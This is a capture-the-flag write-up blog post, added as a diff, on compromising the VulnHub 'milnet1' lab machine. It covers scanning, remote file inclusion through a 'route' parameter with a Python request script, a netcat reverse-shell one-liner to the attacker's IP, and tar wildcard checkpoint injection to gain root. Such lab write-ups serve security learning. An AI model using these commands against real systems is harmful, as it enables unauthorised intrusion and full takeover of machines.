@@ -1,0 +1,145 @@
+---
+layout: post
+title: "milnet1"
+date: 2016-07-28 14:47:38 -0500
+comments: true
+categories: [vulhub, LFI, RFI]
+---
+
+###Tools:
+
+* netdiscover
+* Nmap
+* Wfuzz
+* Nikto
+* Tamper Data
+
+
+
+<!--more-->
+Use netdiscover to detect target IP address
+
+`netdiscover -i eth0 -r 192.168.41.0/24`
+{% img  /images/blog/vulhub/milnet1/Selection_001.png   [title manually exploit [alt text]] %}
+
+192.168.41.154 is the target.
+
+Then run nmap to detect opening ports and running services on the target machine.
+
+`nmap -sV -v -O -A -T5 192.168.41.154 -p-`
+
+{% img  /images/blog/vulhub/milnet1/Selection_002.png   [title manually exploit [alt text]] %}
+
+port 22 and 80 are opening
+
+
+use nmap to run http-enum script:
+
+`nmap 192.168.41.154 -p80 --script http-enum`
+
+{% img  /images/blog/vulhub/milnet1/Selection_003.png   [title manually exploit [alt text]] %}
+
+The info.php file exists.
+
+{% img  /images/blog/vulhub/milnet1/Selection_005.png   [title manually exploit [alt text]] %}
+
+use nikto to scan
+
+`nikto -h 192.168.41.154`
+
+{% img  /images/blog/vulhub/milnet1/Selection_006.png   [title manually exploit [alt text]] %}
+
+use wfuzz to scan
+
+`wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.154/FUZZ 2>/dev/null`
+
+nothing cool.
+
+I use Tamper Data to exam the GET/POST request parameters.
+
+
+{% img  /images/blog/vulhub/milnet1/Selection_007.png   [title manually exploit [alt text]] %}
+
+find an interesting parameter. setup a netcat listerner, and change the parameter value to `http://192.168.41.149/reverse?`
+
+(Here, at first I used reverse.php which created a local reverse shell back to my Kali. I guess there is a filter in target can filter php file, so I just remove .php)
+
+get the shell:
+
+{% img  /images/blog/vulhub/milnet1/Selection_009.png   [title manually exploit [alt text]] %}
+
+In order to make the process easier, I create a short script [send_post.py](https://github.com/wg135/script/blob/master/send_post.py):
+
+```python send_post.py
+#!/usr/bin/env python
+#send post requst to the target
+
+import requests
+import json
+
+url= 'http://192.168.41.154/content.php'
+
+headers = {
+	"Host" : "192.168.41.154",
+	"User-Agent" : "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0",
+	"Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+	"Accept-Language" : "en-US,en;q=0.5",
+	"Accept-Encoding" : "gzip, deflate",
+	"Referer" : "http://192.168.41.154/nav.php",
+	"Connection" : "keep-alive",
+	"Content-Type" : "application/x-www-form-urlencoded",
+	"Content-Length" : "40"
+}
+
+payload = {
+	"route" : "http://192.168.41.149/reverse?"
+}
+
+
+r = requests.post(url, headers=headers, data=payload)
+print (r.status_code)
+```
+
+Next enumeration, no luck on kernerl exploit, check contab job.
+
+`cat /etc/cron*`
+
+got `/etc/crontab`
+
+{% img  /images/blog/vulhub/milnet1/Selection_010.png   [title manually exploit [alt text]] %}
+
+read that file
+
+`cat /etc/crontab`
+
+{% img  /images/blog/vulhub/milnet1/Selection_011.png   [title manually exploit [alt text]] %}
+
+found an interesting file: `/backup/backup.sh`
+
+check that file
+
+{% img  /images/blog/vulhub/milnet1/Selection_012.png   [title manually exploit [alt text]] %}
+
+it uses tar. Searched exploits, no luck.
+
+Under path `/home/langman/SDINET`, I found a file `DefenseCode_Unix_WildCards_Gone_Wild.txt` shows tar cdode execution,
+
+{% img  /images/blog/vulhub/milnet1/Selection_013.png   [title manually exploit [alt text]] %}
+
+in kali:
+
+`nc -nlvp 443`
+
+in target:
+
+```
+$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.41.149 443 > /tmp/f" > shell.sh
+$ touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+$ touch "/var/www/html/--checkpoint=1"
+```
+
+get the root:
+
+{% img  /images/blog/vulhub/milnet1/Selection_014.png   [title manually exploit [alt text]] %}
+
+
